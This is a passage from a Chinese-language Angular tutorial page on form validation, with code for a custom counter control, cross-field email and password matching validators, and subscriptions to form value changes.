class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br></div></div><p>实际使用情况</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> FormBuilder<span class="token punctuation">,</span> FormGroup <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;form [formGroup]=&quot;form&quot;&gt;
      &lt;exe-counter formControlName=&quot;counter&quot; 
        counterRangeMin=&quot;5&quot; 
        counterRangeMax=&quot;8&quot;&gt;
      &lt;/exe-counter&gt;
    &lt;/form&gt;
    &lt;p *ngIf=&quot;!form.valid&quot;&gt;Counter is invalid!&lt;/p&gt;
    &lt;pre&gt;{{ form.get('counter').errors | json }}&lt;/pre&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  form<span class="token operator">:</span> FormGroup<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> fb<span class="token operator">:</span> FormBuilder</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>form <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      counter<span class="token operator">:</span> <span class="token number">5</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>以上代码成功运行后，浏览器页面的显示结果如下：</p> <p><img src="/vuebloger/img/post/2628891360-58f0a2f973c6d_fix732.png" alt=""></p> <h3 id="跨字段验证"><a href="#跨字段验证" class="header-anchor">#</a> 跨字段验证</h3> <ul><li>方式一示例：
emailMatcher</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">emailMatcher</span><span class="token punctuation">(</span><span class="token parameter">c<span class="token operator">:</span> AbstractControl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> emailControl <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> confirmControl <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'confirmEmail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>emailControl<span class="token punctuation">.</span>pristine <span class="token operator">||</span> confirmControl<span class="token punctuation">.</span>pristine<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> emailControl<span class="token punctuation">.</span>value <span class="token operator">===</span> confirmControl<span class="token punctuation">.</span>value <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string">'match'</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>emailGroup</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>signupForm <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    userName<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    emailGroup<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      email<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">,</span> Validators<span class="token punctuation">.</span>email<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      confirmEmail<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> validator<span class="token operator">:</span> emailMatcher <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>方式二示例：</li></ul> <p>接下来我们来实现自定义 equal-validator 指令：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">formControlName</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">validateEqual</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>confirmPassword<span class="token punctuation">&quot;</span></span> 
             <span class="token attr-name">reverse</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>error<span class="token punctuation">&quot;</span></span> <span class="token attr-name">*ngIf</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>user.get('password').invalid &amp;&amp; 
          user.get('password').touched<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        Password is required
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token comment">&lt;!--&lt;pre *ngIf=&quot;user.get('password').errors&quot; class=&quot;margin-20&quot;&gt;
        {{ user.get('password').errors | json }}&lt;/pre&gt;--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Retype password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">formControlName</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>confirmPassword<span class="token punctuation">&quot;</span></span> <span class="token attr-name">validateEqual</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>error<span class="token punctuation">&quot;</span></span> <span class="token attr-name">*ngIf</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>user.get('confirmPassword').invalid &amp;&amp; 
          user.get('confirmPassword').touched<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        Password mismatch
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token comment">&lt;!--&lt;pre *ngIf=&quot;user.get('confirmPassword').errors&quot; class=&quot;margin-20&quot;&gt;
        {{ user.get('confirmPassword').errors | json }}&lt;/pre&gt;--&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>reverse用来解决在两个控互相影响的情况，即错误信息不是添加到当前控件，而是智能添加到目标控件上。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// equal-validator.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> forwardRef<span class="token punctuation">,</span> Attribute <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Validator<span class="token punctuation">,</span> AbstractControl<span class="token punctuation">,</span> <span class="token constant">NG_VALIDATORS</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms'</span><span class="token punctuation">;</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> '<span class="token punctuation">[</span>validateEqual<span class="token punctuation">]</span><span class="token punctuation">[</span>formControlName<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>validateEqual<span class="token punctuation">]</span><span class="token punctuation">[</span>formControl<span class="token punctuation">]</span><span class="token punctuation">,</span>    
          <span class="token punctuation">[</span>validateEqual<span class="token punctuation">]</span><span class="token punctuation">[</span>ngModel<span class="token punctuation">]</span>'<span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">NG_VALIDATORS</span><span class="token punctuation">,</span> useExisting<span class="token operator">:</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> EqualValidator<span class="token punctuation">)</span><span class="token punctuation">,</span> 
              multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">EqualValidator</span> <span class="token keyword">implements</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>@<span class="token function">Attribute</span><span class="token punctuation">(</span><span class="token string">'validateEqual'</span><span class="token punctuation">)</span> <span class="token keyword">public</span> validateEqual<span class="token operator">:</span> string<span class="token punctuation">,</span>
        @<span class="token function">Attribute</span><span class="token punctuation">(</span><span class="token string">'reverse'</span><span class="token punctuation">)</span> <span class="token keyword">public</span> reverse<span class="token operator">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">get</span> <span class="token function">isReverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>reverse<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>reverse <span class="token operator">===</span> <span class="token string">'true'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">validate</span><span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any <span class="token punctuation">}</span> <span class="token punctuation">{</span>
        <span class="token comment">// self value</span>
        <span class="token keyword">let</span> v <span class="token operator">=</span> c<span class="token punctuation">.</span>value<span class="token punctuation">;</span>

        <span class="token comment">// control vlaue</span>
        <span class="token keyword">let</span> e <span class="token operator">=</span> c<span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validateEqual<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// value not equal</span>
        <span class="token comment">// 未设置reverse的值或值为false</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">&amp;&amp;</span> v <span class="token operator">!==</span> e<span class="token punctuation">.</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isReverse<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">return</span> <span class="token punctuation">{</span>
                validateEqual<span class="token operator">:</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// value equal and reverse</span>
        <span class="token comment">// 若值相等且reverse的值为true，则删除validateEqual异常信息</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">&amp;&amp;</span> v <span class="token operator">===</span> e<span class="token punctuation">.</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isReverse<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">delete</span> e<span class="token punctuation">.</span>errors<span class="token punctuation">[</span><span class="token string">'validateEqual'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>errors<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> e<span class="token punctuation">.</span><span class="token function">setErrors</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// value not equal and reverse</span>
        <span class="token comment">// 若值不相等且reverse的值为true，则把异常信息添加到比对的目标控件上</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">&amp;&amp;</span> v <span class="token operator">!==</span> e<span class="token punctuation">.</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isReverse<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            e<span class="token punctuation">.</span><span class="token function">setErrors</span><span class="token punctuation">(</span><span class="token punctuation">{</span> validateEqual<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p>解析1. Directive declaration
使用 @Directive 装饰器来定义指令。然后我们设置该指令的 Metadata 信息：</p> <ul><li>selector - 定义指令在 HTML 代码中匹配的方式</li> <li>providers - 注册EqualValidator</li></ul> <p>解析2. Class defintion</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">EqualValidator</span> <span class="token keyword">implements</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>@<span class="token function">Attribute</span><span class="token punctuation">(</span><span class="token string">'validateEqual'</span><span class="token punctuation">)</span> <span class="token keyword">public</span> validateEqual<span class="token operator">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token function">validate</span><span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any <span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>我们的 EqualValidator 类必须实现 Validator 接口：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span>
  <span class="token function">validate</span><span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> ValidationErrors<span class="token operator">|</span><span class="token keyword">null</span><span class="token punctuation">;</span>
  registerOnValidatorChange<span class="token operator">?</span><span class="token punctuation">(</span><span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>该接口要求定义一个 validate() 方法，因此我们的 `EqualValidator 类中就需要实现 Validator 接口中定义的 validate 方法。此外在构造函数中，我们通过 @Attribute('validateEqual') 装饰器来获取 validateEqual 属性上设置的值。</p> <ol start="3"><li>解析3 Validate implementation</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">validate</span><span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any <span class="token punctuation">}</span> <span class="token punctuation">{</span>
    <span class="token comment">// self value (e.g. retype password)</span>
    <span class="token keyword">let</span> v <span class="token operator">=</span> c<span class="token punctuation">.</span>value<span class="token punctuation">;</span> <span class="token comment">// 获取应用该指令，控件上的值</span>
    <span class="token comment">// control value (e.g. password)</span>
    <span class="token keyword">let</span> e <span class="token operator">=</span> c<span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validateEqual<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取进行值比对的控件</span>
    <span class="token comment">// value not equal</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">&amp;&amp;</span> v <span class="token operator">!==</span> e<span class="token punctuation">.</span>value<span class="token punctuation">)</span> 
     <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token comment">// 若不相等，返回验证失败信息</span>
        validateEqual<span class="token operator">:</span> <span class="token boolean">false</span>
     <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="监听表单值的变化"><a href="#监听表单值的变化" class="header-anchor">#</a> 监听表单值的变化</h3> <ul><li>Reactive Form</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> fb<span class="token operator">:</span> FormBuilder</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>form <span class="token operator">=</span> fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      name<span class="token operator">:</span> <span class="token string">'semlinker'</span><span class="token punctuation">,</span>
      age<span class="token operator">:</span> <span class="token number">31</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>valueChanges<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Form changes'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ul><li>Template-driven Form</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// html</span>
<span class="token operator">&lt;</span>form #myForm<span class="token operator">=</span><span class="token string">&quot;ngForm&quot;</span> <span class="token punctuation">(</span>ngSubmit<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;onSubmit()&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;text&quot;</span>
    name<span class="token operator">=</span><span class="token string">&quot;name&quot;</span> 
    <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-control&quot;</span> 
    required     
    <span class="token punctuation">[</span><span class="token punctuation">(</span>ngModel<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;user.name&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;number&quot;</span> 
     name<span class="token operator">=</span><span class="token string">&quot;age&quot;</span> 
     <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-control&quot;</span> 
     required 
    <span class="token punctuation">[</span><span class="token punctuation">(</span>ngModel<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;user.age&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token comment">// ts</span>
<span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">AfterViewInit</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'myForm'</span><span class="token punctuation">)</span> form<span class="token punctuation">;</span>

  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>control<span class="token punctuation">.</span>valueChanges
      <span class="token punctuation">.</span><span class="token function">debounceTime</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">values</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
